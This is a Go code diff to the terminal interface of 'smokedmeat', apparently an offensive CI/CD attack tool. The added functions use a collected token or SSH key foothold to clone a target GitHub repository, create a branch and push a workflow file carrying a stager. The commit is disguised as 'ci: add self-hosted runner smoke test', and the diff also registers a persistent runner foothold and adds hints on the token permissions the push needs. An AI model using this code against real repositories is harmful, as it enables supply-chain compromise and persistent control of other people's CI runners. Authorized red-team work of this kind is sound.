@@ -5,14 +5,41 @@ package tui
 
 import (
 	"context"
+	"crypto/rand"
+	"encoding/hex"
+	"errors"
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
 	"time"
 
 	tea "charm.land/bubbletea/v2"
+	git "github.com/go-git/go-git/v5"
+	"github.com/go-git/go-git/v5/config"
+	"github.com/go-git/go-git/v5/plumbing"
+	"github.com/go-git/go-git/v5/plumbing/object"
+	"github.com/go-git/go-git/v5/plumbing/transport"
 
 	"github.com/boostsecurityio/smokedmeat/internal/counter"
 )
+
+var pushRunnerTargetWorkflowViaSSHFn = pushRunnerTargetWorkflowViaSSH
+var runnerTargetWorkflowRemoteURLFn = runnerTargetWorkflowRemoteURL
+
+const gitOperationTimeout = 60 * time.Second
+
+func generateRunnerTargetBranchName(now time.Time) string {
+	return fmt.Sprintf("smokedmeat-runner-%d-%s", now.Unix(), runnerTargetBranchSuffix(now))
+}
+
+func runnerTargetBranchSuffix(now time.Time) string {
+	var buf [2]byte
+	if _, err := rand.Read(buf[:]); err == nil {
+		return hex.EncodeToString(buf[:])
+	}
+	return fmt.Sprintf("%04x", now.Nanosecond()&0xffff)
+}
 
 func (m Model) deployAutoDispatch(vuln *Vulnerability, stagerID, payload string, token *CollectedSecret, inputName string, dwellTime time.Duration) tea.Cmd {
 	return func() tea.Msg {
@@ -144,6 +171,153 @@ func (m Model) deployLOTP(vuln *Vulnerability, stagerID string, dwellTime time.D
 	}
 }
 
+func (m Model) deployRunnerTargetAutoWorkflowPush(target *RunnerTargetSelection, stagerID, branchName, workflowPath, workflowYAML string, dwellTime time.Duration, sshState *SSHState) tea.Cmd {
+	return func() tea.Msg {
+		if sshState != nil {
+			pushedBranch, branchURL, err := pushRunnerTargetWorkflowViaSSHFn(sshState, target.Repository, branchName, workflowPath, workflowYAML, "ci: add self-hosted runner smoke test")
+			if err != nil {
+				return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: err}
+			}
+			if strings.TrimSpace(pushedBranch) == "" {
+				return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: fmt.Errorf("workflow push succeeded without a branch name")}
+			}
+			return RunnerTargetWorkflowPushSuccessMsg{
+				StagerID:  stagerID,
+				Target:    target,
+				Branch:    pushedBranch,
+				BranchURL: branchURL,
+				Route:     "ssh",
+				DwellTime: dwellTime,
+			}
+		}
+
+		if m.tokenInfo == nil {
+			return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: fmt.Errorf("no token or SSH write foothold is active")}
+		}
+
+		resp, err := m.kitchenClient.DeploySelfHostedWorkflowPush(context.Background(), counter.DeploySelfHostedWorkflowPushRequest{
+			Token:    m.tokenInfo.Value,
+			RepoName: target.Repository,
+			Branch:   branchName,
+			Path:     workflowPath,
+			Content:  workflowYAML,
+			Title:    "ci: add self-hosted runner smoke test",
+			StagerID: stagerID,
+		})
+		if err != nil {
+			return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: err}
+		}
+		if strings.TrimSpace(resp.Branch) == "" {
+			return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: fmt.Errorf("workflow push succeeded without a branch name")}
+		}
+
+		return RunnerTargetWorkflowPushSuccessMsg{
+			StagerID:  stagerID,
+			Target:    target,
+			Branch:    resp.Branch,
+			BranchURL: resp.BranchURL,
+			Route:     "token",
+			DwellTime: dwellTime,
+		}
+	}
+}
+
+func pushRunnerTargetWorkflowViaSSH(ss *SSHState, repo, branchName, workflowPath, workflowYAML, commitMessage string) (branchNameOut, branchURL string, err error) {
+	if ss == nil || strings.TrimSpace(ss.KeyValue) == "" {
+		return "", "", fmt.Errorf("SSH foothold is not active")
+	}
+
+	auth, err := newGitHubGitAuth(ss.KeyValue)
+	if err != nil {
+		return "", "", fmt.Errorf("invalid SSH private key: %w", err)
+	}
+
+	return pushRunnerTargetWorkflowWithGit(context.Background(), auth, repo, runnerTargetWorkflowRemoteURLFn(repo), branchName, workflowPath, workflowYAML, commitMessage)
+}
+
+func runnerTargetWorkflowRemoteURL(repo string) string {
+	return "ssh://git@github.com/" + repo + ".git"
+}
+
+func pushRunnerTargetWorkflowWithGit(parent context.Context, auth transport.AuthMethod, repo, remoteURL, branchName, workflowPath, workflowYAML, commitMessage string) (branchNameOut, branchURL string, err error) {
+	tmpDir, err := os.MkdirTemp("", "smokedmeat-runner-push-*")
+	if err != nil {
+		return "", "", fmt.Errorf("failed to create temp dir: %w", err)
+	}
+	defer os.RemoveAll(tmpDir)
+
+	if strings.TrimSpace(branchName) == "" {
+		branchName = generateRunnerTargetBranchName(time.Now())
+	}
+	repoDir := filepath.Join(tmpDir, "repo")
+	ctx, cancel := context.WithTimeout(parent, gitOperationTimeout)
+	defer cancel()
+
+	gitRepo, err := git.PlainCloneContext(ctx, repoDir, false, &git.CloneOptions{
+		URL:   remoteURL,
+		Auth:  auth,
+		Depth: 1,
+	})
+	if err != nil {
+		return "", "", gitOperationError(ctx, "clone repository", err)
+	}
+
+	worktree, err := gitRepo.Worktree()
+	if err != nil {
+		return "", "", fmt.Errorf("failed to open git worktree: %w", err)
+	}
+
+	branchRef := plumbing.NewBranchReferenceName(branchName)
+	if err := worktree.Checkout(&git.CheckoutOptions{Branch: branchRef, Create: true}); err != nil {
+		return "", "", fmt.Errorf("failed to create branch %s: %w", branchName, err)
+	}
+
+	targetPath := filepath.Join(repoDir, filepath.FromSlash(workflowPath))
+	if err := os.MkdirAll(filepath.Dir(targetPath), 0o755); err != nil {
+		return "", "", fmt.Errorf("failed to create workflow directory: %w", err)
+	}
+	if err := os.WriteFile(targetPath, []byte(workflowYAML), 0o644); err != nil {
+		return "", "", fmt.Errorf("failed to write workflow file: %w", err)
+	}
+
+	if _, err := worktree.Add(workflowPath); err != nil {
+		return "", "", fmt.Errorf("failed to stage %s: %w", workflowPath, err)
+	}
+	if _, err := worktree.Commit(commitMessage, &git.CommitOptions{
+		Author:    runnerTargetGitSignature(),
+		Committer: runnerTargetGitSignature(),
+	}); err != nil {
+		return "", "", fmt.Errorf("failed to commit %s: %w", workflowPath, err)
+	}
+
+	refSpec := config.RefSpec(fmt.Sprintf("%s:%s", branchRef, branchRef))
+	if err := gitRepo.PushContext(ctx, &git.PushOptions{
+		RemoteName: git.DefaultRemoteName,
+		Auth:       auth,
+		RefSpecs:   []config.RefSpec{refSpec},
+	}); err != nil && !errors.Is(err, git.NoErrAlreadyUpToDate) {
+		return "", "", gitOperationError(ctx, "push branch", err)
+	}
+
+	branchURL = fmt.Sprintf("https://github.com/%s/tree/%s", repo, branchName)
+	return branchName, branchURL, nil
+}
+
+func runnerTargetGitSignature() *object.Signature {
+	return &object.Signature{
+		Name:  "SmokedMeat Counter",
+		Email: "smokedmeat@local.invalid",
+		When:  time.Now(),
+	}
+}
+
+func gitOperationError(ctx context.Context, operation string, err error) error {
+	if ctx.Err() == context.DeadlineExceeded {
+		return fmt.Errorf("git %s timed out after %s", operation, gitOperationTimeout)
+	}
+	return fmt.Errorf("git %s failed: %w", operation, err)
+}
+
 func maskCommandToken(cmd string) string {
 	parts := strings.Fields(cmd)
 	if len(parts) >= 3 && parts[0] == "set" && parts[1] == "token" {
@@ -174,8 +348,14 @@ func parseDeploymentError(err error) string {
 	case strings.Contains(errStr, "410"):
 		return "Issues are disabled on this repository. Use Copy or Comment on existing issue."
 	case strings.Contains(errStr, "403"):
+		if strings.Contains(errStr, "failed to create branch") || strings.Contains(errStr, "create branch ref") {
+			return "GitHub rejected branch creation. Verify effective Contents: write on the target repository."
+		}
+		if strings.Contains(errStr, "failed to commit .github/workflows/") || strings.Contains(errStr, "/contents/.github/workflows/") {
+			return "GitHub rejected the workflow-file write. For App and fine-grained tokens, verify effective Contents: write plus Workflows: write, then refresh the token after any installation permission approval."
+		}
 		if strings.Contains(errStr, "Resource not accessible") {
-			return "Token lacks required permission (fine-grained PAT needs 'Contents: write' and 'Pull requests: write')."
+			return "Token lacks required repository write permission. Fine-grained PATs and GitHub App installation tokens need effective Contents: write and Pull requests: write. If you just changed GitHub App permissions, approve the installation update and mint a fresh installation token."
 		}
 		if strings.Contains(errStr, "must have admin") {
 			return "Token lacks admin access to this repository."
@@ -228,6 +408,10 @@ func (m *Model) registerStagerWithMeta(stagerID string, dwellTime time.Duration,
 
 func (m *Model) registerPersistentCallback(stagerID, payload string, dwellTime time.Duration, metadata map[string]string) (*counter.CallbackPayload, error) {
 	return m.registerCallbackWithPayloadAndMeta(stagerID, payload, dwellTime, 0, metadata, true, "express")
+}
+
+func (m *Model) registerPersistentRunnerFoothold(stagerID string, dwellTime time.Duration, metadata map[string]string) (*counter.CallbackPayload, error) {
+	return m.registerCallbackWithPayloadAndMeta(stagerID, "", dwellTime, 0, metadata, true, "express")
 }
 
 func (m *Model) registerCallbackWithPayloadAndMeta(stagerID, payload string, dwellTime time.Duration, maxCallbacks int, metadata map[string]string, persistent bool, defaultMode string) (*counter.CallbackPayload, error) {
